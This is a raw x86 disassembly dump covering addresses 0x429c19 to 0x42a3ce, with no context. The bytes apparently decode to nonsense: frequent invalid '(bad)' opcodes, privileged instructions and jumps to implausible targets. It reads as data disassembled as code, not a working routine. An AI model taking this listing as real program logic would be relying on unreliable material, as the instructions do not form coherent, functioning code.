  429c19:	test   BYTE PTR [eax+eax*1],bh
  429c1c:	add    BYTE PTR [eax],al
  429c1e:	adc    eax,eax
  429c20:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c28:	jmp    DWORD PTR [eax]
  429c2a:	ror    al,0x5e
  429c2d:	inc    ebp
  429c2e:	leave  
  429c2f:	xor    ecx,DWORD PTR [eax]
  429c31:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c37:	add    ch,al
  429c39:	xor    edi,edi
  429c3b:	xor    DWORD PTR [ebx],0x660033fc
  429c41:	mov    DWORD PTR [ebp-0xc],ecx
  429c44:	pcmpgtw mm0,mm0
  429c47:	add    dl,ah
  429c49:	leave  
  429c4a:	mov    edi,DWORD PTR [esi-0x7d]
  429c4d:	push   ax
  429c4f:	dec    ebp
  429c50:	mov    esi,DWORD PTR [ebx-0x75]
  429c53:	lea    ebp,[eax-0x7c00fffc]
  429c59:	xor    eax,DWORD PTR [eax]
  429c5b:	sysret 
  429c5d:	dec    ebp
  429c5e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c65:	push   WORD PTR [ecx+0x8]
  429c69:	jne    0x429c2c
  429c6b:	ud0    ecx,DWORD PTR [ecx]
  429c6e:	mov    esi,DWORD PTR [edx]
  429c70:	lods   al,BYTE PTR ds:[esi]
  429c71:	add    BYTE PTR [eax],al
  429c73:	data16 (bad) 
  429c75:	iret   
  429c76:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c7d:	cli    
  429c7e:	inc    ebp
  429c7f:	cmp    al,0x8d
  429c81:	add    BYTE PTR [esi+0x2d],ah
  429c84:	inc    ebp
  429c85:	pop    ebp
  429c86:	lea    ecx,[edi]
  429c88:	mov    dl,bh
  429c8a:	add    BYTE PTR [edi],cl
  429c8c:	mov    DWORD PTR [eax+eax*8],edi
  429c8f:	mov    ebx,0x3a87
  429c94:	add    BYTE PTR [ebx],ch
  429c96:	inc    ebp
  429c97:	data16 (bad) 
  429c99:	clc    
  429c9a:	int3   
  429c9b:	cmp    eax,DWORD PTR [eax]
  429c9d:	je     0x429c28
  429c9f:	push   0xffffffc8
  429ca1:	pop    edi
  429ca2:	xchg   DWORD PTR [ebp+0x0],eax
  429ca5:	data16 add BYTE PTR [ebp+0x45],cl
  429ca9:	lea    cx,[ebp+0x10]
  429cad:	jb     0x429caf
  429caf:	jmp    0x429c3a
  429cb1:	call   eax
  429cb3:	clc    
  429cb4:	xchg   DWORD PTR [edi+0x1],edi
  429cb7:	mov    eax,DWORD PTR [eax]
  429cb9:	or     BYTE PTR [ebp-0x49],al
  429cbc:	lea    eax,[eax+0x74003154]
  429cc2:	push   edi
  429cc3:	inc    edx
  429cc4:	jge    0x429cc5
  429cc6:	mov    DWORD PTR [edi],ecx
  429cc8:	fdiv   DWORD PTR [edi-0x6]
  429ccb:	inc    DWORD PTR [eax]
  429ccd:	xor    edx,DWORD PTR [eax+0x5f]
  429cd0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cd3:	ret    0x0
  429cd6:	xor    BYTE PTR [ebp-0x51],cl
  429cd9:	cmp    edi,0xf0ff8904
  429cdf:	data16 ror al,0x84
  429ce3:	rol    BYTE PTR [eax],0x3b
  429ce6:	add    al,dh
  429ce8:	dec    eax
  429ce9:	xchg   esp,eax
  429cea:	push   ebx
  429ceb:	jmp    0x429c78
  429ced:	push   ebp
  429cee:	add    esp,ebp
  429cf0:	add    ebp,esp
  429cf2:	mov    edx,DWORD PTR [edi+0x24]
  429cf5:	clc    
  429cf6:	dec    esi
  429cf7:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429cfd:	cmp    BYTE PTR [ebx],al
  429cff:	jne    0x429c8a
  429d01:	xor    esp,eax
  429d03:	jmp    0x459e86
  429d08:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d0b:	jne    0x429d01
  429d0d:	call   0xffcc9a67
  429d12:	clc    
  429d13:	xchg   edi,eax
  429d14:	sti    
  429d15:	add    DWORD PTR [ebx],eax
  429d17:	add    BYTE PTR [ebp+0x47],bl
  429d1a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d20:	pop    ebp
  429d21:	mov    DWORD PTR [esi-0x48],esi
  429d24:	jmp    0x429d6d
  429d26:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d2c:	(bad)  
  429d2e:	cmp    al,0x0
  429d30:	cmp    eax,DWORD PTR [ebp+0x18]
  429d33:	lea    ebx,[ebp-0x56]
  429d36:	jle    0x429d38
  429d38:	jae    0x429cc3
  429d3a:	mov    eax,esp
  429d3c:	call   0xb900:0x8b005587
  429d43:	inc    ebp
  429d44:	push   ebp
  429d45:	lea    ecx,[ebp-0x27ff4f12]
  429d4b:	mov    eax,edi
  429d4d:	int3   
  429d4e:	push   ebp
  429d4f:	xchg   edi,eax
  429d51:	add    esp,ebp
  429d53:	add    BYTE PTR [eax],al
  429d55:	inc    ebp
  429d56:	add    BYTE PTR [ebp+0x8b3255],cl
  429d5c:	cld    
  429d5d:	mov    DWORD PTR [edx],edi
  429d5f:	aam    0x75
  429d61:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d67:	mov    DWORD PTR [ebx-0x50],edx
  429d6a:	test   BYTE PTR [ebp-0x1],0xe8
  429d6e:	mov    eax,DWORD PTR [eax]
  429d70:	hlt    
  429d71:	add    al,al
  429d73:	mov    eax,DWORD PTR ds:0x890045a8
  429d79:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d7f:	inc    DWORD PTR [eax*2+0xf75854d]
  429d86:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429d8c:	call   0x7298facd
  429d91:	je     0x429df1
  429d93:	js     0x429df4
  429d95:	lock ret 0x7e
  429d99:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429d9f:	mov    edi,edi
  429da1:	sbb    al,bl
  429da3:	clc    
  429da4:	add    BYTE PTR [ebp-0x73],bh
  429da7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dad:	ror    BYTE PTR [eax],1
  429daf:	dec    ebp
  429db0:	xchg   ebp,eax
  429db1:	mov    edi,edi
  429db3:	in     al,0x8b
  429db5:	jge    0x429d40
  429db7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429dbd:	clc    
  429dbe:	pop    esi
  429dbf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429dc5:	clc    
  429dc6:	add    al,0x6e
  429dc8:	mov    eax,DWORD PTR [ebx]
  429dca:	mov    BYTE PTR [ebp+0x0],dl
  429dcd:	mov    edx,DWORD PTR [ebx-0x20]
  429dd0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429dd6:	add    eax,0x3b3a73
  429ddb:	adc    al,0x89
  429ddd:	pop    eax
  429dde:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429de2:	ret    0xf08
  429de5:	cmp    al,0x2
  429de7:	mov    DWORD PTR [edx],esi
  429de9:	cld    
  429dea:	add    BYTE PTR [ebp+0x66],dl
  429ded:	add    eax,ebx
  429def:	add    esp,eax
  429df1:	sub    eax,eax
  429df3:	or     BYTE PTR [ecx-0x77f474bb],cl
  429df9:	add    BYTE PTR [eax],al
  429dfb:	mov    DWORD PTR [ebx-0x24],ebx
  429dfe:	push   edi
  429dff:	push   ebp
  429e00:	clc    
  429e01:	add    DWORD PTR [esi+0x1b0100],0x45
  429e08:	out    0xff,eax
  429e0a:	add    edx,DWORD PTR [eax]
  429e0c:	jmp    0x429df6
  429e0e:	cmp    ch,0x43
  429e11:	(bad)  
  429e12:	jmp    0x40c82664
  429e17:	je     0x429da3
  429e19:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e1f:	inc    ebp
  429e20:	add    BYTE PTR [ebx-0x770375],al
  429e26:	add    ah,ch
  429e28:	add    edx,esp
  429e2a:	pop    edi
  429e2b:	pop    ebp
  429e2c:	push   ebp
  429e2d:	inc    ebx
  429e2e:	in     al,dx
  429e2f:	pop    ebp
  429e30:	in     al,dx
  429e31:	cmp    edx,DWORD PTR [edi-0x8]
  429e34:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e3b:	add    al,0x47
  429e3d:	push   ebp
  429e3e:	mov    esp,ebp
  429e40:	in     al,0x45
  429e42:	dec    ebp
  429e43:	push   esi
  429e44:	test   DWORD PTR [eax+0xff010f],esi
  429e4a:	add    BYTE PTR [eax+0xc018b],dh
  429e50:	leave  
  429e51:	inc    ebp
  429e52:	test   al,ch
  429e54:	add    dh,bh
  429e56:	add    bh,bh
  429e58:	dec    ebp
  429e59:	push   cs
  429e5a:	mov    DWORD PTR [ecx],eax
  429e5c:	hlt    
  429e5d:	push   es
  429e5e:	dec    ebp
  429e5f:	leave  
  429e60:	mov    DWORD PTR [eax],ecx
  429e62:	clc    
  429e63:	cmovge eax,ecx
  429e66:	mov    ecx,0x85c2f0
  429e6c:	clc    
  429e6d:	pop    DWORD PTR [ebp+0x1]
  429e70:	aas    
  429e71:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e78:	push   esi
  429e79:	add    BYTE PTR [ebp-0x4],al
  429e7c:	mov    DWORD PTR [eax],eax
  429e7e:	cld    
  429e7f:	inc    bp
  429e81:	add    DWORD PTR [edx],edi
  429e83:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429e8b:	mov    ebx,0xcd4f68
  429e90:	mov    edi,DWORD PTR [ebx]
  429e92:	or     al,0x75
  429e94:	(bad)  
  429e95:	xor    ecx,ebx
  429e97:	enterw 0x4d01,0x87
  429e9c:	jmp    0x429ea2
  429ea1:	ret    
  429ea2:	inc    ebp
  429ea3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ea9:	add    dh,cl
  429eab:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429eb3:	icebp  
  429eb4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eba:	inc    ebp
  429ebb:	inc    edx
  429ebc:	mov    ecx,DWORD PTR [edx]
  429ebe:	or     al,0xf9
  429ec0:	(bad)  
  429ec1:	jne    0x429e91
  429ec3:	mov    cl,0x0
  429ec6:	rol    BYTE PTR [esi+0x450134],1
  429ecc:	add    eax,edi
  429ece:	cld    
  429ecf:	ret    
  429ed0:	dec    ebp
  429ed1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ed7:	mov    edi,0xf82c8534
  429edc:	jmp    0x429f5b
  429ede:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429ee4:	mov    dl,0x8b
  429ee6:	sub    cl,BYTE PTR [eax]
  429ee8:	mov    ecx,ecx
  429eea:	in     al,dx
  429eeb:	test   cl,dh
  429eed:	add    BYTE PTR [edx],al
  429eef:	add    BYTE PTR [eax-0x377a97b3],al
  429ef5:	cmovge esi,esp
  429ef8:	add    eax,DWORD PTR [eax]
  429efa:	cld    
  429efb:	mov    eax,DWORD PTR [ecx]
  429efd:	adc    BYTE PTR [ebp+0x4d],cl
  429f00:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f06:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f0c:	cmp    esp,ebx
  429f0e:	jne    0x429eac
  429f10:	mov    eax,edi
  429f12:	adc    ah,ch
  429f14:	push   ebp
  429f15:	test   DWORD PTR [ebx],esi
  429f17:	clc    
  429f18:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f1e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f21:	dec    ebp
  429f22:	adc    bh,al
  429f24:	push   0x8b85ff10
  429f29:	clc    
  429f2a:	or     al,0x50
  429f2c:	(bad)  
  429f2d:	push   ecx
  429f2e:	retf   
  429f2f:	mov    ebx,0xff4d8dc8
  429f34:	mov    DWORD PTR [ebp+0x8],eax
  429f37:	xor    eax,DWORD PTR [ebp-0x75]
  429f3a:	cmp    ebp,DWORD PTR [ebx]
  429f3c:	lsl    ebx,WORD PTR [edi-0x8]
  429f40:	call   DWORD PTR [ebx-0x741bff75]
  429f46:	(bad)  
  429f47:	or     al,0x5b
  429f49:	dec    ebp
  429f4a:	or     BYTE PTR [ebx],dh
  429f4c:	inc    ebp
  429f4d:	xor    esi,DWORD PTR ds:0x708088d
  429f53:	in     eax,0x98
  429f55:	add    BYTE PTR [edx],dh
  429f57:	inc    ebp
  429f58:	pop    edi
  429f59:	xor    eax,edx
  429f5b:	test   DWORD PTR [eax],0x81108b8b
  429f61:	dec    ebp
  429f62:	sub    al,0x33
  429f64:	add    BYTE PTR [ebx],dh
  429f66:	push   esi
  429f67:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f6d:	mov    edi,eax
  429f6f:	or     BYTE PTR [ebp+0x45],al
  429f72:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f78:	cmp    cl,cl
  429f7a:	pushf  
  429f7b:	push   es
  429f7c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429f83:	dec    ebp
  429f84:	inc    ebp
  429f85:	and    BYTE PTR [eax],0x50
  429f88:	pushf  
  429f89:	push   0x4de4d1c7
  429f8e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429f94:	fsubr  st,st(1)
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	rol    bh,cl
  429f99:	mov    edx,esp
  429f9b:	or     BYTE PTR [ebp+0x4588f84d],al
  429fa1:	mov    ecx,DWORD PTR [eax]
  429fa3:	or     BYTE PTR [eax],al
  429fa5:	push   ebp
  429fa6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fac:	dec    ebp
  429fad:	enter  0xceba,0x8
  429fb1:	retf   0x1807
  429fb4:	ret    0x984d
  429fb7:	mov    esi,DWORD PTR [edx]
  429fb9:	or     al,0x33
  429fbb:	into   
  429fbc:	add    edx,esi
  429fbe:	add    ecx,edx
  429fc0:	bswap  eax
  429fc2:	ror    esi,0x98
  429fc5:	dec    ebp
  429fc6:	add    cl,ch
  429fc8:	mov    edi,edi
  429fca:	hlt    
  429fcb:	inc    esi
  429fcd:	inc    ebp
  429fce:	ret    0x4533
  429fd1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429fd7:	or     BYTE PTR [ebx],dh
  429fd9:	dec    ebp
  429fda:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429fe0:	jne    0xff8c9fa7
  429fe6:	inc    ebp
  429fe7:	inc    ebp
  429fe8:	mov    esi,DWORD PTR [ebx]
  429fea:	clc    
  429feb:	pop    esi
  429fec:	ret    0xcaeb
  429fef:	mov    eax,esi
  429ff1:	call   0x5203f0c4
  429ff6:	dec    ebp
  429ff7:	add    eax,0xf8728b
  429ffc:	adc    eax,0xce0ccac9
  42a001:	push   ebp
  42a002:	ret    0xc6ec
  42a005:	in     al,dx
  42a006:	call   0x3342ed0f
  42a00b:	push   edi
  42a00c:	add    edi,eax
  42a00e:	xor    eax,eax
  42a010:	jmp    0x42a057
  42a012:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a018:	add    eax,edi
  42a01a:	shr    eax,cl
  42a01c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a022:	mov    edi,DWORD PTR [ecx]
  42a024:	in     al,dx
  42a025:	pushf  
  42a026:	ret    0x84c7
  42a029:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a02f:	inc    ebp
  42a030:	in     al,dx
  42a031:	cmp    BYTE PTR [ebp-0x64],al
  42a034:	mov    eax,edi
  42a036:	cld    
  42a037:	fmul   st(2),st
  42a039:	sbb    dl,al
  42a03b:	jmp    0x9c3b:0x374d45c1
  42a042:	jbe    0x42a00b
  42a044:	mov    esp,eax
  42a046:	clc    
  42a047:	add    BYTE PTR [ebp+0x0],cl
  42a04a:	mov    ecx,ecx
  42a04c:	lea    eax,[ebp-0x5]
  42a04f:	mov    edi,edi
  42a051:	call   0x51cdf09b
  42a056:	hlt    
  42a057:	xor    eax,edx
  42a059:	mov    esi,0x987284
  42a05e:	xor    cl,dl
  42a060:	mov    esi,eax
  42a062:	hlt    
  42a063:	into   
  42a064:	inc    ebp
  42a065:	scas   eax,DWORD PTR es:[edi]
  42a066:	mov    ebp,ecx
  42a068:	cld    
  42a069:	add    dl,cl
  42a06b:	add    dl,al
  42a06d:	inc    ebp
  42a06e:	shr    DWORD PTR [ebx],0x4d
  42a071:	xor    edi,DWORD PTR [ebx]
  42a073:	mov    DWORD PTR [edi],ecx
  42a075:	clc    
  42a076:	dec    esi
  42a077:	inc    ebp
  42a078:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a07e:	ret    0xc6ca
  42a081:	mov    BYTE PTR [ebp-0x32],0x53
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	inc    ebp
  42a087:	jmp    0x42a0c0
  42a089:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a090:	pop    ebx
  42a091:	xor    ecx,DWORD PTR [ebp+0x3]
  42a094:	mov    eax,DWORD PTR [ebx]
  42a096:	clc    
  42a097:	test   edx,ecx
  42a099:	mov    ecx,esi
  42a09b:	cld    
  42a09c:	call   0x8ab6e5e6
  42a0a1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0a7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0ad:	fdiv   QWORD PTR [ebx]
  42a0af:	retf   0xce89
  42a0b2:	in     al,0xc1
  42a0b4:	inc    ebp
  42a0b5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0bb:	into   
  42a0bc:	mov    dh,0xc1
  42a0bf:	call   0x8c16e648
  42a0c4:	(bad)  
  42a0c5:	cld    
  42a0c6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0c9:	xor    eax,ecx
  42a0cb:	lea    eax,[ebp+0x8]
  42a0ce:	mov    esi,DWORD PTR [edx-0x4]
  42a0d1:	add    dl,al
  42a0d3:	inc    ebp
  42a0d4:	mov    esp,0x32d8988b
  42a0d9:	dec    ebp
  42a0da:	mov    esi,DWORD PTR [ebx]
  42a0dc:	cld    
  42a0dd:	xor    eax,edx
  42a0df:	sub    ebp,DWORD PTR [eax-0x75]
  42a0e2:	int    0xec
  42a0e4:	sub    ecx,eax
  42a0e6:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a0ec:	mov    esi,esp
  42a0ee:	call   0x3416ee77
  42a0f3:	inc    DWORD PTR [ebx]
  42a0f5:	mov    edi,DWORD PTR [ebx]
  42a0f7:	cld    
  42a0f8:	jne    0x42a147
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	aam    0x8d
  42a0fe:	dec    ebp
  42a0ff:	or     BYTE PTR [ebx],dh
  42a101:	jb     0x42a106
  42a103:	add    BYTE PTR [edi+0x45],bl
  42a106:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a10d:	xor    ebp,esp
  42a10f:	xor    eax,edi
  42a111:	sub    edi,esp
  42a113:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a119:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a120:	inc    ebp
  42a121:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a127:	clc    
  42a128:	mov    eax,edi
  42a12a:	nop
  42a12b:	fadd   QWORD PTR [eax]
  42a12d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a133:	jmp    0x42a0be
  42a135:	mov    eax,DWORD PTR [ecx]
  42a137:	fadd   DWORD PTR [eax]
  42a139:	inc    ebp
  42a13a:	or     DWORD PTR [ebx],esi
  42a13c:	dec    eax
  42a13d:	add    edx,DWORD PTR [ebx-0x2d]
  42a140:	dec    ebp
  42a141:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a147:	inc    ebp
  42a148:	push   eax
  42a149:	mov    dl,BYTE PTR [ecx-0xd]
  42a14c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a14f:	(bad)  
  42a151:	rol    BYTE PTR [eax],0xc1
  42a154:	ret    
  42a155:	inc    ebp
  42a156:	inc    ebp
  42a157:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a15d:	xor    eax,ebx
  42a15f:	add    eax,DWORD PTR [ebp+0x23]
  42a162:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a168:	cmp    edi,0xc
  42a16b:	dec    ebp
  42a16c:	inc    ebp
  42a16d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a173:	inc    ebp
  42a174:	mov    esi,DWORD PTR [ebx]
  42a176:	clc    
  42a177:	lea    eax,[ebp+0x45725407]
  42a17d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a181:	xor    edi,DWORD PTR [eax]
  42a183:	mov    ecx,0xff8b8d4d
  42a188:	push   esp
  42a189:	enter  0x4df7,0x23
  42a18d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a193:	mov    eax,DWORD PTR [ebx]
  42a195:	loopne 0x42a182
  42a197:	ret    0xc68b
  42a19a:	push   esp
  42a19b:	enter  0x9745,0x8b
  42a19f:	inc    ebp
  42a1a0:	cld    
  42a1a1:	mov    eax,edi
  42a1a3:	clc    
  42a1a4:	ret    
  42a1a5:	ret    0xc645
  42a1a8:	mov    esi,DWORD PTR [ebx]
  42a1aa:	cld    
  42a1ab:	pop    esi
  42a1ac:	mov    ebx,0x83458bc3
  42a1b2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1b6:	dec    ebp
  42a1b7:	cmp    BYTE PTR [ebx],dh
  42a1b9:	pushf  
  42a1ba:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1c0:	fcom   DWORD PTR [ebp+0x45]
  42a1c3:	mov    edi,DWORD PTR [edx]
  42a1c5:	adc    al,0x9c
  42a1c7:	inc    ebp
  42a1c8:	(bad)  
  42a1c9:	mov    ebx,eax
  42a1cb:	adc    al,0x85
  42a1cd:	cmp    al,0x1
  42a1d0:	inc    ebp
  42a1d1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1d8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1de:	xor    eax,DWORD PTR [ebx]
  42a1e0:	add    edi,DWORD PTR [ecx+ecx*4]
  42a1e3:	mov    esp,esi
  42a1e5:	clc    
  42a1e6:	inc    ebp
  42a1e7:	inc    ebp
  42a1e8:	add    edx,DWORD PTR [esi+0xc]
  42a1eb:	mov    edi,0x7ff0845
  42a1f0:	in     al,dx
  42a1f1:	(bad)  
  42a1f2:	jne    0x42a18c
  42a1f4:	mov    esi,DWORD PTR [edx]
  42a1f6:	clc    
  42a1f7:	add    ebp,DWORD PTR [edx]
  42a1f9:	mov    edi,edi
  42a1fb:	in     al,dx
  42a1fc:	mov    DWORD PTR [ebp-0x10],eax
  42a1ff:	xor    eax,DWORD PTR [ebp+0x3]
  42a202:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a208:	fmul   DWORD PTR [ebx-0x173caf39]
  42a20e:	lea    ecx,[ecx+0x45e8d4bc]
  42a214:	clc    
  42a215:	mov    edi,edi
  42a217:	cmp    BYTE PTR [ebp+0x4d],al
  42a21a:	test   DWORD PTR [eax+0x74],ecx
  42a21d:	inc    ecx
  42a21e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a224:	ret    
  42a225:	inc    eax
  42a226:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a22c:	push   eax
  42a22d:	dec    eax
  42a22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a22f:	sar    bh,1
  42a231:	enter  0x458b,0xec
  42a235:	mov    eax,DWORD PTR [ebp+0x38]
  42a238:	mov    eax,ecx
  42a23a:	fadd   DWORD PTR [ebx]
  42a23c:	dec    ebp
  42a23d:	inc    eax
  42a23e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a244:	inc    ebp
  42a245:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a24b:	fadd   QWORD PTR [ebx]
  42a24d:	inc    ebp
  42a24e:	or     al,0x33
  42a250:	dec    ebp
  42a251:	add    edi,DWORD PTR [ebx]
  42a253:	mov    DWORD PTR [edx-0x28],esi
  42a256:	mov    eax,DWORD PTR [ebp-0x10]
  42a259:	mov    eax,DWORD PTR [eax+0x10]
  42a25c:	mov    eax,edi
  42a25e:	lock ret 
  42a260:	inc    ecx
  42a261:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a267:	fsubr  st,st(5)
  42a269:	test   DWORD PTR [eax],eax
  42a26b:	clc    
  42a26c:	push   0x45
  42a26e:	(bad)  
  42a26f:	cmp    ebp,esp
  42a271:	pushf  
  42a272:	inc    ebp
  42a273:	(bad)  
  42a274:	push   eax
  42a275:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a279:	clc    
  42a27a:	mov    eax,0xf8008584
  42a27f:	mov    eax,DWORD PTR [ebp-0x4]
  42a282:	mov    edi,0x4585c3cc
  42a288:	clc    
  42a289:	mov    eax,DWORD PTR [ebp+0x14]
  42a28c:	cmp    al,BYTE PTR [ebp-0x64]
  42a28f:	mov    edi,eax
  42a291:	in     al,dx
  42a292:	les    esi,FWORD PTR [ebp-0x7b]
  42a295:	mov    edi,eax
  42a297:	or     al,0x4d
  42a299:	dec    ebp
  42a29a:	mov    eax,ebp
  42a29c:	in     al,0xf2
  42a29e:	dec    ebp
  42a29f:	dec    DWORD PTR [ecx+0x4dc7e045]
  42a2a5:	fmul   DWORD PTR [ecx+0x4df8f085]
  42a2ab:	inc    ebp
  42a2ac:	mov    DWORD PTR [ebx],esi
  42a2ae:	fadd   QWORD PTR [ebx]
  42a2b0:	dec    ebp
  42a2b1:	push   eax
  42a2b2:	xor    eax,DWORD PTR [ebp+0x3]
  42a2b5:	push   eax
  42a2b6:	mov    DWORD PTR [eax],ebx
  42a2b8:	fdivr  st,st(7)
  42a2ba:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42a2c1:	dec    esi
  42a2c2:	clc    
  42a2c3:	inc    ebp
  42a2c4:	test   BYTE PTR [ebx],dh
  42a2c6:	add    DWORD PTR [ebx],eax
  42a2c8:	add    BYTE PTR [eax+0x4d],dl
  42a2cb:	jne    0x42a300
  42a2cd:	lea    ecx,[ebx-0x7617fc44]
  42a2d3:	div    ah
  42a2d5:	inc    DWORD PTR [ebp+0x45]
  42a2d8:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42a2de:	jb     0x42a26b
  42a2e0:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42a2e7:	mov    ecx,DWORD PTR [ebp-0x10]
  42a2ea:	xor    ecx,DWORD PTR [ebp+0x3]
  42a2ed:	mov    edi,DWORD PTR [ebx]
  42a2ef:	adc    BYTE PTR [ebp+0x41],dh
  42a2f2:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42a2f8:	ret    
  42a2f9:	push   ss
  42a2fa:	push   0x45
  42a2fc:	lea    ecx,[ebx+0x4de80cb0]
  42a302:	sti    
  42a303:	add    edi,edi
  42a305:	or     BYTE PTR [ebp+0x4d],al
  42a308:	mov    ebp,DWORD PTR [ebx]
  42a30a:	xor    ebp,ecx
  42a30c:	mov    al,BYTE PTR [edx]
  42a30e:	add    eax,0xc7200
  42a313:	jne    0x42a362
  42a315:	lea    esi,[ebx]
  42a317:	mov    al,0xf
  42a319:	call   0xe99de
  42a31e:	sar    DWORD PTR [eax],0x84
  42a321:	pushf  
  42a322:	add    DWORD PTR [ecx+0x4545d000],ecx
  42a328:	mov    edi,DWORD PTR [ecx]
  42a32a:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42a331:	test   DWORD PTR [eax],eax
  42a333:	clc    
  42a334:	dec    ebp
  42a335:	inc    ebp
  42a336:	xor    edi,DWORD PTR [ebx]
  42a338:	setl   al
  42a33b:	(bad)  
  42a33c:	retf   
  42a33d:	rol    cl,1
  42a33f:	dec    ebp
  42a340:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42a346:	inc    ebp
  42a347:	lea    ecx,[ebx-0x75b2cc38]
  42a34d:	lea    eax,ds:0x4d72c4
  42a353:	mov    ecx,DWORD PTR [ebp-0x4]
  42a356:	xor    ecx,edi
  42a358:	bswap  ebx
  42a35a:	ror    BYTE PTR [ebp-0x35],0xe9
  42a35e:	rol    DWORD PTR [ecx],0x84
  42a361:	add    BYTE PTR [ecx],al
  42a363:	cmp    al,BYTE PTR [eax]
  42a365:	pushf  
  42a366:	inc    ebp
  42a367:	jnp    0x8a42d76a
  42a36d:	mov    eax,DWORD PTR ds:0xcf72e8
  42a373:	lock dec ebp
  42a375:	retf   
  42a376:	xor    ecx,DWORD PTR [ebp+0xf]
  42a379:	mov    eax,eax
  42a37b:	fmul   st,st(3)
  42a37d:	test   ecx,0x1988484
  42a383:	xor    al,BYTE PTR [eax]
  42a385:	mov    DWORD PTR [ebp-0x28],eax
  42a388:	mov    eax,DWORD PTR [ebp+0x33]
  42a38b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42a391:	ret    
  42a392:	add    al,cl
  42a394:	dec    ebp
  42a395:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42a39b:	add    ecx,DWORD PTR ds:0xc7250
  42a3a1:	inc    ebp
  42a3a2:	rcl    DWORD PTR [eax+0x4d],0x27
  42a3a6:	mov    edi,edi
  42a3a8:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42a3ae:	jb     0x42a377
  42a3b0:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42a3b7:	mov    esi,DWORD PTR [ebx]
  42a3b9:	cld    
  42a3ba:	mov    cl,bh
  42a3bc:	or     eax,0x372b6
  42a3c1:	cmp    ecx,eax
  42a3c3:	jne    0x42a440
  42a3c9:	mov    eax,DWORD PTR [ebp-0x20]
  42a3cc:	mov    eax,DWORD PTR [eax]
  42a3ce:	xor    eax,edi
